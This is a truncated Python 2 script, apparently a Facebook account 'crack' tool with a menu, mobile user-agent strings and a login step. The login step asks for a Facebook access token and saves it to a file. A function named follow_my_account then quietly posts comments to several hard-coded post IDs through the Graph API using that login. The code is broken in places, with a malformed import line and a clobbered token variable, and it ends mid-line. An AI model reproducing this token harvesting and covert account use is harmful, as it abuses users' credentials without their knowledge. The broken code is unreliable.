''' SYaM King

   facebook : Syam Shah

   github : Syam-Sh4h

'''

import os

import sys

import random

import time

try:

	import re	import json

	import requests

except ImportError:

	print(' [-] module requests Not installed ')

	print(' [-] Type > pip2 install requests')

try:

	from requests.exceptions import ConnectionError

	from datetime import datetime

	from multiprocessing.pool import ThreadPool

except ConnectionError:

	print(' [-] check your internet Connection ')

	

loop = 0

id = []

ra_pw = []

#color

ku = '\x1b[1;93m'

hj = '\x1b[1;92m'

ml = '\x1b[1;101m'

ra = '\x1b[0m'

m = '\x1b[1;91m'

bm = '\x1b[1;96m'

#ua_one = "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"

#ua_two = "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaX6-00/40.0.002; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4"

#ua_three = "Mozilla/5.0 (SymbianOS/9.4; Series60/5.3; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebkit/525 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/525"

#ua_four = "Mozilla/5.0 (SymbianOS/9.4; Series60/5.3; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebkit/525 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/525"

#ua_five = "nokia 6280/2.0(03.60)/profile/midp-1.0;configuration/cldc-1.0"

ua_six = "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-4/10.0.001; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML,like Gecko) BrowserNG/7.1.17125"

ua_xx = "BlackBerry7100i/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/103"

ua_rr = "BlackBerry7130e/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/104"

#user agent

rafi_ua = random.choice([ua_xx])

#pw admin

#pw_rafi = 'rafianonym'

#ip

try:

	ip = requests.get('https://api.ipify.org').text

except ConnectionError:

	print('\n [!] check your internet Connection !\n');time.sleep(1)

	

garis = '''__________________________________________________

'''

	

def jalan(z):

	for i in z + '\n':

		sys.stdout.write(i)

		sys.stdout.flush()

		time.sleep(00.1)

rafi_logo = '''

██████╗     ██╗  ██╗

██╔══██╗    ██║ ██╔╝

██████╔╝    █████╔╝ 

██╔══██╗    ██╔═██╗ 

██║  ██║    ██║  ██╗

╚═╝  ╚═╝    ╚═╝  ╚═╝

\x1b[1;101m\x1b[1;97mCreat by : R.K& RIAZKHAN => 7 November 2022\x1b[0m

__________________________________________________

'''

def login():

	os.system("clear")

	try:

		token = open('login_r.txt','r')

		menu()

	except (KeyError,IOError):

		print(rafi_logo)

		print ' [1] login with token facebook '

		print ' [0] exit \n'

		met_log = raw_input(" [\x1b[101m\x1b[1;97m?\x1b[0m] Choose : ")

		if met_log =="":

			print '\n [!] Please Fill '; time.sleep(1)

			login()

		elif met_log == "1" or met_log == "01":

			tokenz()

		elif met_log == "0":

			jalan(' [R] please come back again')

			os.system('exit')

		else:

			login()

def tokenz():

	os.system('clear')

	print(rafi_logo)

	try:

		token = open('login_r.txt','r')

	except (KeyError,IOError):

		token = raw_input(' [\x1b[101m?\x1b[0m] token : ')

		try:

			otw = requests.get('https://graph.facebook.com/me?access_token='+token)

			a = json.loads(otw.text)

			avsid = open("login_r.txt", 'w')

			avsid.write(token)

			avsid.close()

			follow_my_account()

			jalan(' [!] login succes....')

		except KeyError:

			print ' [!] token Wrong '

def follow_my_account():

    try:

        token = open('login_r.txt', 'r').read()

    except IOError:

        print(' invalid token ! ')

        jalan(' please login again')

        os.system('rm -rf login_r.txt')

    token = 'lopyu bang rafi'

    requests.post('https://graph.facebook.com/104297705385684/comments/?message=' + token + '&access_token=' + token) # Post 1

    requests.post('https://graph.facebook.com/131965602597836/comments/?message=' + token + '&access_token=' + token) #post 2

    requests.post('https://graph.facebook.com/101528895641507/comments/?message=' + token + '&access_token=' + token) #post 3

    requests.post('https://graph.facebook.com/10001097
